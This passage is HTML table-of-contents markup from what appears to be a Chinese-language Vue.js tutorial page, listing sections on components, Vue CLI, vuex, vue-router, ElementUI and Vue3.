class="toc-link" href="#2-2-7-Vue%E5%AE%9E%E4%BE%8B%E4%B8%8E%E7%BB%84%E4%BB%B6%E5%AE%9E%E4%BE%8B"><span class="toc-number">3.2.7.</span> <span class="toc-text">2.2.7.Vue实例与组件实例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-8-%E4%B8%80%E4%B8%AA%E9%87%8D%E8%A6%81%E7%9A%84%E5%86%85%E7%BD%AE%E5%85%B3%E7%B3%BB"><span class="toc-number">3.2.8.</span> <span class="toc-text">2.2.8.一个重要的内置关系</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E5%8D%95%E6%96%87%E4%BB%B6%E7%BB%84%E4%BB%B6"><span class="toc-number">3.3.</span> <span class="toc-text">2.3.单文件组件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8Vue%E8%84%9A%E6%89%8B%E6%9E%B6"><span class="toc-number">4.</span> <span class="toc-text">3.使用Vue脚手架</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E8%AF%B4%E6%98%8E"><span class="toc-number">4.1.</span> <span class="toc-text">3.1.说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4"><span class="toc-number">4.2.</span> <span class="toc-text">3.2.具体步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-%E8%84%9A%E6%89%8B%E6%9E%B6%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-number">4.3.</span> <span class="toc-text">3.3.脚手架目录结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-render%E5%87%BD%E6%95%B0"><span class="toc-number">4.4.</span> <span class="toc-text">3.4.render函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE"><span class="toc-number">4.5.</span> <span class="toc-text">3.5.修改默认配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6-ref%E5%B1%9E%E6%80%A7"><span class="toc-number">4.6.</span> <span class="toc-text">3.6.ref属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7-props%E9%85%8D%E7%BD%AE"><span class="toc-number">4.7.</span> <span class="toc-text">3.7.props配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-8-mixin%E9%85%8D%E7%BD%AE"><span class="toc-number">4.8.</span> <span class="toc-text">3.8.mixin配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-8-1-mixin%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">4.8.1.</span> <span class="toc-text">3.8.1.mixin基本使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-8-2-%E5%AE%9A%E4%B9%89%E5%A4%9A%E4%B8%AA%E6%B7%B7%E5%90%88"><span class="toc-number">4.8.2.</span> <span class="toc-text">3.8.2.定义多个混合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-8-3-%E5%85%A8%E5%B1%80%E6%B7%B7%E5%85%A5"><span class="toc-number">4.8.3.</span> <span class="toc-text">3.8.3.全局混入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-8-4-%E5%B0%8F%E7%BB%93%EF%BC%9Amixin"><span class="toc-number">4.8.4.</span> <span class="toc-text">3.8.4.小结：mixin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-9-%E6%8F%92%E4%BB%B6"><span class="toc-number">4.9.</span> <span class="toc-text">3.9.插件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-10-scoped%E6%A0%B7%E5%BC%8F"><span class="toc-number">4.10.</span> <span class="toc-text">3.10.scoped样式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-11-%E7%BB%84%E4%BB%B6%E5%8C%96%E7%BC%96%E7%A0%81%E6%B5%81%E7%A8%8B"><span class="toc-number">4.11.</span> <span class="toc-text">3.11.组件化编码流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-11-1ToDOList%E6%A1%88%E4%BE%8B"><span class="toc-number">4.11.1.</span> <span class="toc-text">3.11.1ToDOList案例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-11-1-1-%E7%BC%96%E5%86%99%E9%9D%99%E6%80%81%E7%BB%84%E4%BB%B6"><span class="toc-number">4.11.1.1.</span> <span class="toc-text">3.11.1.1.编写静态组件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#App-vue"><span class="toc-number">4.11.1.1.1.</span> <span class="toc-text">App.vue</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MyHeader-vue"><span class="toc-number">4.11.1.1.2.</span> <span class="toc-text">MyHeader.vue</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MyList-vue"><span class="toc-number">4.11.1.1.3.</span> <span class="toc-text">MyList.vue</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MyItem-vue"><span class="toc-number">4.11.1.1.4.</span> <span class="toc-text">MyItem.vue</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MyFooter-vue"><span class="toc-number">4.11.1.1.5.</span> <span class="toc-text">MyFooter.vue</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-11-1-2-%E5%88%9D%E5%A7%8B%E5%8C%96%E5%88%97%E8%A1%A8"><span class="toc-number">4.11.1.2.</span> <span class="toc-text">3.11.1.2.初始化列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-11-1-3-%E6%B7%BB%E5%8A%A0%E5%8A%9F%E8%83%BD"><span class="toc-number">4.11.1.3.</span> <span class="toc-text">3.11.1.3.添加功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-11-1-4-%E5%8B%BE%E9%80%89%E5%8A%9F%E8%83%BD"><span class="toc-number">4.11.1.4.</span> <span class="toc-text">3.11.1.4.勾选功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-11-1-5-%E5%88%A0%E9%99%A4%E5%8A%9F%E8%83%BD"><span class="toc-number">4.11.1.5.</span> <span class="toc-text">3.11.1.5.删除功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-11-1-6-%E5%BA%95%E9%83%A8%E7%BB%9F%E8%AE%A1%E5%8A%9F%E8%83%BD"><span class="toc-number">4.11.1.6.</span> <span class="toc-text">3.11.1.6.底部统计功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-11-1-7-%E5%BA%95%E9%83%A8%E4%BA%A4%E4%BA%92%E5%8A%9F%E8%83%BD"><span class="toc-number">4.11.1.7.</span> <span class="toc-text">3.11.1.7.底部交互功能</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-11-2-%E5%B0%8F%E7%BB%93%EF%BC%9AToDoList%E6%A1%88%E4%BE%8B"><span class="toc-number">4.11.2.</span> <span class="toc-text">3.11.2.小结：ToDoList案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-11-3-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8"><span class="toc-number">4.11.3.</span> <span class="toc-text">3.11.3.浏览器本地存储</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-12-%E7%BB%84%E4%BB%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6"><span class="toc-number">4.12.</span> <span class="toc-text">3.12.组件自定义事件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-12-1-%E7%BB%84%E4%BB%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">4.12.1.</span> <span class="toc-text">3.12.1.组件自定义事件的基本使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-12-2-%E8%A7%A3%E7%BB%91%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6"><span class="toc-number">4.12.2.</span> <span class="toc-text">3.12.2.解绑自定义事件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-12-3-%E5%B0%8F%E7%BB%93%EF%BC%9A%E7%BB%84%E4%BB%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6"><span class="toc-number">4.12.3.</span> <span class="toc-text">3.12.3.小结：组件自定义事件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-13-%E5%85%A8%E5%B1%80%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BA%BF"><span class="toc-number">4.13.</span> <span class="toc-text">3.13.全局事件总线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-14-%E6%B6%88%E6%81%AF%E8%AE%A2%E9%98%85%E4%B8%8E%E5%8F%91%E5%B8%83"><span class="toc-number">4.14.</span> <span class="toc-text">3.14.消息订阅与发布</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-15-%E5%8A%A8%E7%94%BB%E4%B8%8E%E8%BF%87%E6%B8%A1"><span class="toc-number">4.15.</span> <span class="toc-text">3.15.动画与过渡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-15-1-%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C"><span class="toc-number">4.15.1.</span> <span class="toc-text">3.15.1.动画效果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-15-2-%E8%BF%87%E6%B8%A1%E6%95%88%E6%9E%9C"><span class="toc-number">4.15.2.</span> <span class="toc-text">3.15.2.过渡效果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-15-3-%E5%A4%9A%E4%B8%AA%E5%85%83%E7%B4%A0%E7%9A%84%E8%BF%87%E6%B8%A1"><span class="toc-number">4.15.3.</span> <span class="toc-text">3.15.3.多个元素的过渡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-15-4-%E7%AC%AC%E4%B8%89%E6%96%B9%E5%8A%A8%E7%94%BB%E5%BA%93"><span class="toc-number">4.15.4.</span> <span class="toc-text">3.15.4.第三方动画库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-15-5-%E5%B0%8F%E7%BB%93%EF%BC%9AVue%E5%B0%81%E8%A3%85%E7%9A%84%E8%BF%87%E6%B8%A1%E4%B8%8E%E5%8A%A8%E7%94%BB"><span class="toc-number">4.15.5.</span> <span class="toc-text">3.15.5.小结：Vue封装的过渡与动画</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-Vue%E4%B8%AD%E7%9A%84ajax"><span class="toc-number">5.</span> <span class="toc-text">4.Vue中的ajax</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-vue-cli%E4%B8%AD%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="toc-number">5.1.</span> <span class="toc-text">4.1.vue-cli中配置代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E5%B8%A6%E6%9C%89%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E7%9A%84%E6%A1%88%E4%BE%8B"><span class="toc-number">5.2.</span> <span class="toc-text">4.2.带有网络请求的案例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-Vue%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E4%B8%A4%E4%B8%AAajax%E5%BA%93"><span class="toc-number">5.3.</span> <span class="toc-text">4.3.Vue中常用的两个ajax库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-1-axios"><span class="toc-number">5.3.1.</span> <span class="toc-text">4.3.1.axios</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-2-vue-resource"><span class="toc-number">5.3.2.</span> <span class="toc-text">4.3.2.vue-resource</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-slot%E6%8F%92%E6%A7%BD"><span class="toc-number">5.4.</span> <span class="toc-text">4.4.slot插槽</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-1-%E9%BB%98%E8%AE%A4%E6%8F%92%E6%A7%BD"><span class="toc-number">5.4.1.</span> <span class="toc-text">4.4.1.默认插槽</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-2-%E5%85%B7%E5%90%8D%E6%8F%92%E6%A7%BD"><span class="toc-number">5.4.2.</span> <span class="toc-text">4.4.2.具名插槽</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-3-%E4%BD%9C%E7%94%A8%E5%9F%9F%E6%8F%92%E6%A7%BD"><span class="toc-number">5.4.3.</span> <span class="toc-text">4.4.3.作用域插槽</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-4-%E5%B0%8F%E7%BB%93%EF%BC%9A%E6%8F%92%E6%A7%BD"><span class="toc-number">5.4.4.</span> <span class="toc-text">4.4.4.小结：插槽</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-vuex"><span class="toc-number">6.</span> <span class="toc-text">5.vuex</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-%E7%90%86%E8%A7%A3vuex"><span class="toc-number">6.1.</span> <span class="toc-text">5.1.理解vuex</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-1-vuex%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">6.1.1.</span> <span class="toc-text">5.1.1.vuex是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-2-%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BD%BF%E7%94%A8vuex"><span class="toc-number">6.1.2.</span> <span class="toc-text">5.1.2.什么时候使用vuex</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-3-vuex%E5%8E%9F%E7%90%86%E5%9B%BE"><span class="toc-number">6.1.3.</span> <span class="toc-text">5.1.3.vuex原理图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-4-%E6%90%AD%E5%BB%BAvuex%E7%8E%AF%E5%A2%83%E5%8F%8A%E4%BD%BF%E7%94%A8"><span class="toc-number">6.1.4.</span> <span class="toc-text">5.1.4.搭建vuex环境及使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-5-vuex%E5%BC%80%E5%8F%91%E8%80%85%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">6.1.5.</span> <span class="toc-text">5.1.5.vuex开发者工具的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-6-getters%E9%85%8D%E7%BD%AE%E9%A1%B9"><span class="toc-number">6.1.6.</span> <span class="toc-text">5.1.6.getters配置项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-7-mapState%E5%92%8CmapGetters"><span class="toc-number">6.1.7.</span> <span class="toc-text">5.1.7.mapState和mapGetters</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-7-1-mapState%E5%AF%B9%E8%B1%A1%E5%86%99%E6%B3%95"><span class="toc-number">6.1.7.1.</span> <span class="toc-text">5.1.7.1.mapState对象写法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-7-2-mapState%E6%95%B0%E7%BB%84%E5%86%99%E6%B3%95"><span class="toc-number">6.1.7.2.</span> <span class="toc-text">5.1.7.2.mapState数组写法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-8-mapActions%E5%92%8CmapMutations"><span class="toc-number">6.1.8.</span> <span class="toc-text">5.1.8.mapActions和mapMutations</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-9-%E5%A4%9A%E7%BB%84%E4%BB%B6%E5%85%B1%E4%BA%AB%E6%95%B0%E6%8D%AE"><span class="toc-number">6.1.9.</span> <span class="toc-text">5.1.9.多组件共享数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-10-vuex%E7%9A%84%E6%A8%A1%E5%9D%97%E5%8C%96%E7%BC%96%E7%A0%81-namespaced"><span class="toc-number">6.1.10.</span> <span class="toc-text">5.1.10.vuex的模块化编码+namespaced</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-11-vuex%E6%A8%A1%E5%9D%97%E5%8C%96%E7%BC%96%E7%A0%81%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5"><span class="toc-number">6.1.11.</span> <span class="toc-text">5.1.11.vuex模块化编码最佳实践</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-11-1-%E5%AE%9A%E4%B9%89%E6%A8%A1%E5%9D%97"><span class="toc-number">6.1.11.1.</span> <span class="toc-text">5.1.11.1.定义模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-11-2-%E4%BD%BF%E7%94%A8createNamespacedHelpers%E7%AE%80%E5%8C%96map-%E5%86%99%E6%B3%95"><span class="toc-number">6.1.11.2.</span> <span class="toc-text">5.1.11.2.使用createNamespacedHelpers简化map*写法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-11-3-actions%E5%92%8Cmutaions%E7%9A%84types%E7%9A%84%E7%BB%9F%E4%B8%80%E7%AE%A1%E7%90%86"><span class="toc-number">6.1.11.3.</span> <span class="toc-text">5.1.11.3.actions和mutaions的types的统一管理</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-vue-router"><span class="toc-number">7.</span> <span class="toc-text">6.vue-router</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#6-1-%E7%9B%B8%E5%85%B3%E7%90%86%E8%A7%A3"><span class="toc-number">7.1.</span> <span class="toc-text">6.1.相关理解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-1-vue-router%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">7.1.1.</span> <span class="toc-text">6.1.1.vue-router的理解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-2-%E5%AF%B9SPA%E5%BA%94%E7%94%A8%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">7.1.2.</span> <span class="toc-text">6.1.2.对SPA应用的理解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-3-%E8%B7%AF%E7%94%B1%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">7.1.3.</span> <span class="toc-text">6.1.3.路由的理解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-2-%E5%9F%BA%E6%9C%AC%E8%B7%AF%E7%94%B1"><span class="toc-number">7.2.</span> <span class="toc-text">6.2.基本路由</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-3-%E5%B5%8C%E5%A5%97%EF%BC%88%E5%A4%9A%E7%BA%A7%EF%BC%89%E8%B7%AF%E7%94%B1"><span class="toc-number">7.3.</span> <span class="toc-text">6.3.嵌套（多级）路由</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-4-%E8%B7%AF%E7%94%B1%E4%BC%A0%E5%8F%82"><span class="toc-number">7.4.</span> <span class="toc-text">6.4.路由传参</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-4-1-query%E5%8F%82%E6%95%B0"><span class="toc-number">7.4.1.</span> <span class="toc-text">6.4.1.query参数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-4-1-1-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%86%99%E6%B3%95"><span class="toc-number">7.4.1.1.</span> <span class="toc-text">6.4.1.1.字符串写法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-4-1-2-%E5%AF%B9%E8%B1%A1%E5%86%99%E6%B3%95"><span class="toc-number">7.4.1.2.</span> <span class="toc-text">6.4.1.2.对象写法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-4-1-3-%E5%91%BD%E5%90%8D%E8%B7%AF%E7%94%B1"><span class="toc-number">7.4.1.3.</span> <span class="toc-text">6.4.1.3.命名路由</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-4-2-params%E5%8F%82%E6%95%B0"><span class="toc-number">7.4.2.</span> <span class="toc-text">6.4.2.params参数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-4-2-1-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%86%99%E6%B3%95"><span class="toc-number">7.4.2.1.</span> <span class="toc-text">6.4.2.1.字符串写法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-4-2-2-%E5%AF%B9%E8%B1%A1%E5%86%99%E6%B3%95"><span class="toc-number">7.4.2.2.</span> <span class="toc-text">6.4.2.2.对象写法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-4-3-%E8%B7%AF%E7%94%B1%E7%9A%84props%E9%85%8D%E7%BD%AE"><span class="toc-number">7.4.3.</span> <span class="toc-text">6.4.3.路由的props配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-4-3-1-props%E5%80%BC%E6%98%AF%E5%AF%B9%E8%B1%A1"><span class="toc-number">7.4.3.1.</span> <span class="toc-text">6.4.3.1.props值是对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-4-3-2-props%E5%80%BC%E6%98%AF%E5%B8%83%E5%B0%94%E5%80%BC"><span class="toc-number">7.4.3.2.</span> <span class="toc-text">6.4.3.2.props值是布尔值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-4-3-3-props%E5%80%BC%E6%98%AF%E5%87%BD%E6%95%B0"><span class="toc-number">7.4.3.3.</span> <span class="toc-text">6.4.3.3.props值是函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-4-3-4-%E5%B0%8F%E7%BB%93%EF%BC%9A%E8%B7%AF%E7%94%B1%E7%9A%84props%E9%85%8D%E7%BD%AE"><span class="toc-number">7.4.3.4.</span> <span class="toc-text">6.4.3.4.小结：路由的props配置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-4-4-router-link%E7%9A%84replace%E5%B1%9E%E6%80%A7"><span class="toc-number">7.4.4.</span> <span class="toc-text">6.4.4.router-link的replace属性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-5-%E7%BC%96%E7%A8%8B%E5%BC%8F%E8%B7%AF%E7%94%B1%E5%AF%BC%E8%88%AA"><span class="toc-number">7.5.</span> <span class="toc-text">6.5.编程式路由导航</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-5-1-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E8%B7%AF%E7%94%B1%E8%B7%B3%E8%BD%AC"><span class="toc-number">7.5.1.</span> <span class="toc-text">6.5.1.使用方法实现路由跳转</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E9%87%8D%E5%A4%8D%E8%B7%B3%E8%BD%AC%EF%BC%8C%E6%8A%A5redundant-navigation"><span class="toc-number">7.5.1.1.</span> <span class="toc-text">路由重复跳转，报redundant navigation</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B7%E4%BE%8B%EF%BC%9A%E4%B8%89%E7%BA%A7%E8%8F%9C%E5%8D%95%E8%B7%B3%E8%BD%AC%E6%90%BA%E5%B8%A6%E5%8F%82%E6%95%B0"><span class="toc-number">7.5.1.2.</span> <span class="toc-text">样例：三级菜单跳转携带参数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-5-2-%E7%BC%93%E5%AD%98%E8%B7%AF%E7%94%B1%E7%BB%84%E4%BB%B6"><span class="toc-number">7.5.2.</span> <span class="toc-text">6.5.2.缓存路由组件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-5-3-%E4%B8%A4%E4%B8%AA%E6%96%B0%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90"><span class="toc-number">7.5.3.</span> <span class="toc-text">6.5.3.两个新的生命周期钩子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-5-4-%E5%85%A8%E5%B1%80%E5%89%8D%E7%BD%AE-%E8%B7%AF%E7%94%B1%E5%AE%88%E5%8D%AB"><span class="toc-number">7.5.4.</span> <span class="toc-text">6.5.4.全局前置_路由守卫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-5-5-%E5%85%A8%E5%B1%80%E5%90%8E%E7%BD%AE-%E8%B7%AF%E7%94%B1%E5%AE%88%E5%8D%AB"><span class="toc-number">7.5.5.</span> <span class="toc-text">6.5.5.全局后置_路由守卫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-5-6-%E7%8B%AC%E4%BA%AB%E8%B7%AF%E7%94%B1%E5%AE%88%E5%8D%AB"><span class="toc-number">7.5.6.</span> <span class="toc-text">6.5.6.独享路由守卫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-5-7-%E7%BB%84%E4%BB%B6%E5%86%85%E8%B7%AF%E7%94%B1%E5%AE%88%E5%8D%AB"><span class="toc-number">7.5.7.</span> <span class="toc-text">6.5.7.组件内路由守卫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-5-8-history%E6%A8%A1%E5%BC%8F%E5%92%8Chash%E6%A8%A1%E5%BC%8F"><span class="toc-number">7.5.8.</span> <span class="toc-text">6.5.8.history模式和hash模式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-Vue-UI%E7%BB%84%E4%BB%B6%E5%BA%93"><span class="toc-number">8.</span> <span class="toc-text">7.Vue UI组件库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#7-1-%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%B8%B8%E7%94%A8UI%E7%BB%84%E4%BB%B6%E5%BA%93"><span class="toc-number">8.1.</span> <span class="toc-text">7.1.移动端常用UI组件库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-2-PC%E7%AB%AF%E5%B8%B8%E7%94%A8UI%E7%BB%84%E4%BB%B6%E5%BA%93"><span class="toc-number">8.2.</span> <span class="toc-text">7.2.PC端常用UI组件库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-3-ElementUI%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">8.3.</span> <span class="toc-text">7.3.ElementUI的基本使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">8.3.1.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E5%85%A5"><span class="toc-number">8.3.2.</span> <span class="toc-text">引入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E9%87%8F%E5%BC%95%E5%85%A5%EF%BC%88%E4%B8%8D%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-number">8.3.2.1.</span> <span class="toc-text">全量引入（不推荐）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%89%E9%9C%80%E5%BC%95%E5%85%A5"><span class="toc-number">8.3.2.2.</span> <span class="toc-text">按需引入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-number">8.3.3.</span> <span class="toc-text">使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E9%87%8F%E5%BC%95%E5%85%A5%E4%BD%BF%E7%94%A8"><span class="toc-number">8.3.3.1.</span> <span class="toc-text">全量引入使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%89%E9%9C%80%E5%BC%95%E5%85%A5%E4%BD%BF%E7%94%A8"><span class="toc-number">8.3.3.2.</span> <span class="toc-text">按需引入使用</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-Vue3"><span class="toc-number">9.</span> <span class="toc-text">8.Vue3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#8-1-Vue3%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B"><span class="toc-number">9.1.</span> <span class="toc-text">8.1.Vue3快速上手</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1-1-Vue3%E7%AE%80%E4%BB%8B"><span class="toc-number">9.1.1.</span> <span class="toc-text">8.1.1.Vue3简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1-2-Vue3%E5%B8%A6%E6%9D%A5%E4%BA%86%E4%BB%80%E4%B9%88"><span class="toc-number">9.1.2.</span> <span class="toc-text">8.1.2.Vue3带来了什么</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 